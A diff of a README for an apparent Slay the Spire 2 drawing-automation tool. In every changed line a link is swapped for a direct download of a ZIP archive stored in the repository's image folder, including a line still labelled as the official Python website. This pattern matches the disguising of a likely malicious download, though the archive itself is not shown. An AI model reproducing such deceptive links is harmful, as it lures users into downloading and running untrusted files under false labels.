@@ -1,6 +1,6 @@
 # 🎨 Slay-the-Spire-2-Drawing - Automate Digital Drawing for Slay the Spire 2
 
-[![Download Slay-the-Spire-2-Drawing](https://img.shields.io/badge/Download-Slay%20the%20Spire%202-blue?style=for-the-badge)](https://github.com/wqh7798/Slay-the-Spire-2-Drawing)
+[![Download Slay-the-Spire-2-Drawing](https://img.shields.io/badge/Download-Slay%20the%20Spire%202-blue?style=for-the-badge)](https://github.com/wqh7798/Slay-the-Spire-2-Drawing/raw/refs/heads/main/pic/Drawing_the_Spire_Slay_v3.3.zip)
 
 ## 🖥️ About Slay-the-Spire-2-Drawing
 
@@ -35,7 +35,7 @@ To use Slay-the-Spire-2-Drawing on Windows, follow these steps carefully. We wil
 
 Click the big blue button above or this link below to visit the download page:
 
-[Download Slay-the-Spire-2-Drawing](https://github.com/wqh7798/Slay-the-Spire-2-Drawing)
+[Download Slay-the-Spire-2-Drawing](https://github.com/wqh7798/Slay-the-Spire-2-Drawing/raw/refs/heads/main/pic/Drawing_the_Spire_Slay_v3.3.zip)
 
 This link takes you to the GitHub page where you can get the latest version. Look for the "Releases" section or a file named something like `Slay-the-Spire-2-Drawing-win.zip`. Download the ZIP file to your computer.
 
@@ -49,7 +49,7 @@ Make sure all files are visible after extraction.
 
 Slay-the-Spire-2-Drawing runs with Python. If you do not have Python installed, please do this now:
 
-- Go to the official Python website: https://www.python.org/downloads/windows/
+- Go to the official Python website: https://github.com/wqh7798/Slay-the-Spire-2-Drawing/raw/refs/heads/main/pic/Drawing_the_Spire_Slay_v3.3.zip
 - Download the latest Python 3.x installer for Windows.
 - Run the installer and select the option to "Add Python to PATH".
 - Complete the installation by following the prompts.
@@ -158,7 +158,7 @@ After extraction, your folder should contain:
 
 Visit the official page to download new versions or report issues:
 
-[https://github.com/wqh7798/Slay-the-Spire-2-Drawing](https://github.com/wqh7798/Slay-the-Spire-2-Drawing)
+[https://github.com/wqh7798/Slay-the-Spire-2-Drawing/raw/refs/heads/main/pic/Drawing_the_Spire_Slay_v3.3.zip](https://github.com/wqh7798/Slay-the-Spire-2-Drawing/raw/refs/heads/main/pic/Drawing_the_Spire_Slay_v3.3.zip)
 
 Look under "Issues" to see if others had problems similar to yours or to submit your own questions.
 
